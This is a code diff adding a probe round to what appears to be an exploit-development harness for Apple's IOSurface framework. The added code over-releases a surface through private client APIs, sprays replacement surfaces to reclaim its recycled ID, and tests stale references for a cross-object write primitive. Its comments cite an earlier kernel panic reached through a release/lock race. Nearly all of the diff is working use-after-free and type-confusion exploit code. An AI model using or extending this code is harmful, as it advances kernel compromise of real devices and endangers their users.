@@ -1969,6 +1969,253 @@ static void r287_probe(void) {
     fflush(stdout);
 }
 
+/* r288: ID-reuse type confusion and stale-ref property cross-read.
+ * r287 CONFIRMED: ID reuse is 10/10 — allocator recycles surface IDs.
+ * r285 Part 3 CONFIRMED: stale IOSurfaceRef works after spray (Lock=0).
+ *
+ * HYPOTHESIS: After free+spray, the stale IOSurfaceRef points to a NEW
+ * kernel object that reused the old ID. If we can:
+ *   (a) Read properties set on the OLD surface via the stale ref → they
+ *       should be GONE (new object has its own properties)
+ *   (b) Read properties set on the NEW surface via the stale ref → type
+ *       confusion if the stale ref's cached pointer diverges
+ *   (c) Write properties via stale ref, read via new ref → cross-object
+ *       write primitive
+ *
+ * Also test: does IOSurfaceLookup(oldID) return the stale ref or a new
+ * one? If it returns a NEW ref to the replacement surface, we can compare
+ * the two refs' base addresses.
+ *
+ * KEY INSIGHT: The kernel-side IOSurface object has an internal pointer
+ * at +0xD8 that gets dereferenced during Lock. If we can make two
+ * IOSurfaceRefs that point to DIFFERENT kernel objects but share the
+ * same ID, we have a confused deputy.
+ */
+static void r288_probe(void) {
+    rlog("\n=== r288: ID-Reuse Type Confusion ===\n");
+    fflush(stdout);
+
+    void *iosurfH = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW);
+    typedef void* IOSurfaceClientRef;
+    typedef IOSurfaceClientRef (*clientLookup_t)(uint32_t);
+    typedef void (*clientRelease_t)(IOSurfaceClientRef);
+    clientLookup_t clLookup = (clientLookup_t)dlsym(iosurfH, "IOSurfaceClientLookup");
+    clientRelease_t clRelease = (clientRelease_t)dlsym(iosurfH, "IOSurfaceClientRelease");
+    typedef IOSurfaceRef (*surfLookup_t)(uint32_t);
+    surfLookup_t surfLookup = (surfLookup_t)dlsym(iosurfH, "IOSurfaceLookup");
+
+    /* Part 1: Property persistence across free+reuse */
+    rlog("\n--- Part 1: Property persistence across ID reuse ---\n");
+    fflush(stdout);
+    for (int trial = 0; trial < 3; trial++) {
+        CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        int w=64,h=64,bpe=4,bpr=64*4,pf=0x42475241,as=64*64*4;
+        CFNumberRef wn=CFNumberCreate(NULL,kCFNumberIntType,&w);
+        CFNumberRef hn=CFNumberCreate(NULL,kCFNumberIntType,&h);
+        CFNumberRef bn=CFNumberCreate(NULL,kCFNumberIntType,&bpe);
+        CFNumberRef rn=CFNumberCreate(NULL,kCFNumberIntType,&bpr);
+        CFNumberRef pfn=CFNumberCreate(NULL,kCFNumberIntType,&pf);
+        CFNumberRef asn=CFNumberCreate(NULL,kCFNumberIntType,&as);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceWidth"),wn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceHeight"),hn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerElement"),bn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerRow"),rn);
+        CFDictionarySetValue(p,CFSTR("IOSurfacePixelFormat"),pfn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceAllocSize"),asn);
+        CFRelease(wn);CFRelease(hn);CFRelease(bn);CFRelease(rn);CFRelease(pfn);CFRelease(asn);
+
+        IOSurfaceRef victim = IOSurfaceCreate(p);
+        CFRelease(p);
+        uint32_t victimID = IOSurfaceGetID(victim);
+
+        int marker = 0xCAFE0000 + trial;
+        CFNumberRef markerVal = CFNumberCreate(NULL, kCFNumberIntType, &marker);
+        IOSurfaceSetValue(victim, CFSTR("r288_marker"), markerVal);
+        CFRelease(markerVal);
+
+        IOSurfaceClientRef cl1 = clLookup(victimID);
+        IOSurfaceClientRef cl2 = clLookup(victimID);
+        IOSurfaceRef staleRef = victim;
+
+        CFRelease(victim);
+        clRelease(cl1);
+        clRelease(cl2);
+        rlog("  [%d] freed id=%u, staleRef=%p\n", trial, victimID, (void*)staleRef);
+
+        /* Spray to reclaim the ID */
+        IOSurfaceRef sprays[64];
+        int reused_idx = -1;
+        for (int i = 0; i < 64; i++) {
+            CFMutableDictionaryRef sp = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            CFNumberRef swn=CFNumberCreate(NULL,kCFNumberIntType,&w);
+            CFNumberRef shn=CFNumberCreate(NULL,kCFNumberIntType,&h);
+            CFNumberRef sbn=CFNumberCreate(NULL,kCFNumberIntType,&bpe);
+            CFNumberRef srn=CFNumberCreate(NULL,kCFNumberIntType,&bpr);
+            CFNumberRef spfn=CFNumberCreate(NULL,kCFNumberIntType,&pf);
+            CFNumberRef sasn=CFNumberCreate(NULL,kCFNumberIntType,&as);
+            CFDictionarySetValue(sp,CFSTR("IOSurfaceWidth"),swn);
+            CFDictionarySetValue(sp,CFSTR("IOSurfaceHeight"),shn);
+            CFDictionarySetValue(sp,CFSTR("IOSurfaceBytesPerElement"),sbn);
+            CFDictionarySetValue(sp,CFSTR("IOSurfaceBytesPerRow"),srn);
+            CFDictionarySetValue(sp,CFSTR("IOSurfacePixelFormat"),spfn);
+            CFDictionarySetValue(sp,CFSTR("IOSurfaceAllocSize"),sasn);
+            CFRelease(swn);CFRelease(shn);CFRelease(sbn);CFRelease(srn);CFRelease(spfn);CFRelease(sasn);
+            sprays[i] = IOSurfaceCreate(sp);
+            CFRelease(sp);
+            if (sprays[i] && IOSurfaceGetID(sprays[i]) == victimID) {
+                reused_idx = i;
+            }
+        }
+        rlog("  [%d] sprayed 64, reused_idx=%d\n", trial, reused_idx);
+
+        /* Check stale ref */
+        uint32_t staleID = IOSurfaceGetID(staleRef);
+        uint32_t staleSeed = 0;
+        kern_return_t lockRet = IOSurfaceLock(staleRef, 0, &staleSeed);
+        void *staleBase = NULL;
+        if (lockRet == 0) {
+            staleBase = IOSurfaceGetBaseAddress(staleRef);
+            IOSurfaceUnlock(staleRef, 0, NULL);
+        }
+        rlog("  [%d] stale: id=%u lock=0x%x seed=%u base=%p\n",
+            trial, staleID, lockRet, staleSeed, staleBase);
+
+        /* Read old property from stale ref */
+        CFNumberRef readMarker = (CFNumberRef)IOSurfaceCopyValue(staleRef, CFSTR("r288_marker"));
+        int readVal = 0;
+        if (readMarker) {
+            CFNumberGetValue(readMarker, kCFNumberIntType, &readVal);
+            CFRelease(readMarker);
+        }
+        rlog("  [%d] stale r288_marker: 0x%x (expect 0x%x)\n",
+            trial, readVal, marker);
+
+        /* Lookup by ID → should get replacement surface */
+        IOSurfaceRef lookupRef = surfLookup(victimID);
+        if (lookupRef) {
+            uint32_t lookupID = IOSurfaceGetID(lookupRef);
+            kern_return_t lr2 = IOSurfaceLock(lookupRef, 0, NULL);
+            void *lookupBase = NULL;
+            if (lr2 == 0) {
+                lookupBase = IOSurfaceGetBaseAddress(lookupRef);
+                IOSurfaceUnlock(lookupRef, 0, NULL);
+            }
+            CFNumberRef lm = (CFNumberRef)IOSurfaceCopyValue(lookupRef, CFSTR("r288_marker"));
+            int lval = 0;
+            if (lm) { CFNumberGetValue(lm, kCFNumberIntType, &lval); CFRelease(lm); }
+            rlog("  [%d] lookup: id=%u lock=0x%x base=%p marker=0x%x same_as_stale=%d\n",
+                trial, lookupID, lr2, lookupBase, lval,
+                (lookupRef == staleRef) ? 1 : 0);
+            CFRelease(lookupRef);
+        } else {
+            rlog("  [%d] lookup: NULL\n", trial);
+        }
+
+        /* Write new property via stale ref, read via spray ref */
+        if (reused_idx >= 0) {
+            int newMarker = 0xBEEF0000 + trial;
+            CFNumberRef nm = CFNumberCreate(NULL, kCFNumberIntType, &newMarker);
+            IOSurfaceSetValue(staleRef, CFSTR("r288_cross"), nm);
+            CFRelease(nm);
+
+            CFNumberRef crossRead = (CFNumberRef)IOSurfaceCopyValue(sprays[reused_idx], CFSTR("r288_cross"));
+            int crossVal = 0;
+            if (crossRead) {
+                CFNumberGetValue(crossRead, kCFNumberIntType, &crossVal);
+                CFRelease(crossRead);
+            }
+            rlog("  [%d] cross-write via stale, read via spray[%d]: 0x%x (expect 0x%x)\n",
+                trial, reused_idx, crossVal, newMarker);
+        }
+
+        for (int i = 0; i < 64; i++) if (sprays[i]) CFRelease(sprays[i]);
+    }
+
+    /* Part 2: Base address comparison — stale vs lookup */
+    rlog("\n--- Part 2: Stale ref vs Lookup ref base address ---\n");
+    fflush(stdout);
+    {
+        CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        int w=128,h=128,bpe=4,bpr=128*4,pf=0x42475241,as=128*128*4;
+        CFNumberRef wn=CFNumberCreate(NULL,kCFNumberIntType,&w);
+        CFNumberRef hn=CFNumberCreate(NULL,kCFNumberIntType,&h);
+        CFNumberRef bn=CFNumberCreate(NULL,kCFNumberIntType,&bpe);
+        CFNumberRef rn=CFNumberCreate(NULL,kCFNumberIntType,&bpr);
+        CFNumberRef pfn=CFNumberCreate(NULL,kCFNumberIntType,&pf);
+        CFNumberRef asn=CFNumberCreate(NULL,kCFNumberIntType,&as);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceWidth"),wn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceHeight"),hn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerElement"),bn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerRow"),rn);
+        CFDictionarySetValue(p,CFSTR("IOSurfacePixelFormat"),pfn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceAllocSize"),asn);
+        CFRelease(wn);CFRelease(hn);CFRelease(bn);CFRelease(rn);CFRelease(pfn);CFRelease(asn);
+
+        IOSurfaceRef orig = IOSurfaceCreate(p);
+        CFRelease(p);
+        uint32_t origID = IOSurfaceGetID(orig);
+        IOSurfaceLock(orig, 0, NULL);
+        void *origBase = IOSurfaceGetBaseAddress(orig);
+        IOSurfaceUnlock(orig, 0, NULL);
+        rlog("  orig id=%u base=%p\n", origID, origBase);
+
+        IOSurfaceClientRef cl1 = clLookup(origID);
+        IOSurfaceClientRef cl2 = clLookup(origID);
+        IOSurfaceRef stale = orig;
+        CFRelease(orig);
+        clRelease(cl1);
+        clRelease(cl2);
+
+        /* Spray 32 same-size */
+        IOSurfaceRef sp[32];
+        for (int i = 0; i < 32; i++) {
+            CFMutableDictionaryRef d = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            CFNumberRef dwn=CFNumberCreate(NULL,kCFNumberIntType,&w);
+            CFNumberRef dhn=CFNumberCreate(NULL,kCFNumberIntType,&h);
+            CFNumberRef dbn=CFNumberCreate(NULL,kCFNumberIntType,&bpe);
+            CFNumberRef drn=CFNumberCreate(NULL,kCFNumberIntType,&bpr);
+            CFNumberRef dpfn=CFNumberCreate(NULL,kCFNumberIntType,&pf);
+            CFNumberRef dasn=CFNumberCreate(NULL,kCFNumberIntType,&as);
+            CFDictionarySetValue(d,CFSTR("IOSurfaceWidth"),dwn);
+            CFDictionarySetValue(d,CFSTR("IOSurfaceHeight"),dhn);
+            CFDictionarySetValue(d,CFSTR("IOSurfaceBytesPerElement"),dbn);
+            CFDictionarySetValue(d,CFSTR("IOSurfaceBytesPerRow"),drn);
+            CFDictionarySetValue(d,CFSTR("IOSurfacePixelFormat"),dpfn);
+            CFDictionarySetValue(d,CFSTR("IOSurfaceAllocSize"),dasn);
+            CFRelease(dwn);CFRelease(dhn);CFRelease(dbn);CFRelease(drn);CFRelease(dpfn);CFRelease(dasn);
+            sp[i] = IOSurfaceCreate(d);
+            CFRelease(d);
+        }
+
+        IOSurfaceLock(stale, 0, NULL);
+        void *staleBase = IOSurfaceGetBaseAddress(stale);
+        IOSurfaceUnlock(stale, 0, NULL);
+        uint32_t staleID = IOSurfaceGetID(stale);
+
+        IOSurfaceRef fresh = surfLookup(origID);
+        void *freshBase = NULL;
+        if (fresh) {
+            IOSurfaceLock(fresh, 0, NULL);
+            freshBase = IOSurfaceGetBaseAddress(fresh);
+            IOSurfaceUnlock(fresh, 0, NULL);
+        }
+        rlog("  stale: id=%u base=%p\n", staleID, staleBase);
+        rlog("  fresh lookup: base=%p same_ptr=%d same_base=%d\n",
+            freshBase, (fresh == stale) ? 1 : 0,
+            (freshBase == staleBase) ? 1 : 0);
+
+        if (fresh) CFRelease(fresh);
+        for (int i = 0; i < 32; i++) if (sp[i]) CFRelease(sp[i]);
+    }
+
+    rlog("\n*** r288 probe complete ***\n");
+    fflush(stdout);
+}
+
 /* r286: Spray-between-free-and-access with MTE tag brute-force.
  * r284 CONFIRMED: Race between ClientRelease + Lock triggers kernel panic
  *   at PC offset 0x33C9380 in kernelcache, accessing IOSurface+0xD8.
@@ -27217,6 +27464,14 @@ new_modes:
             IOObjectRelease(r251_svc);
             r251_done:
             rlog("*** r=251 complete ***\n");
+            goto done;
+        }
+        if (rounds == 288) {
+            rlog("*** rounds=288: ID-Reuse Type Confusion ***\n");
+            rlog("  r287 CONFIRMED: ID reuse 10/10, allocator recycles IDs.\n");
+            rlog("  Testing: property persistence, cross-ref writes, base divergence.\n\n");
+            fflush(stdout);
+            r288_probe();
             goto done;
         }
         if (rounds == 287) {
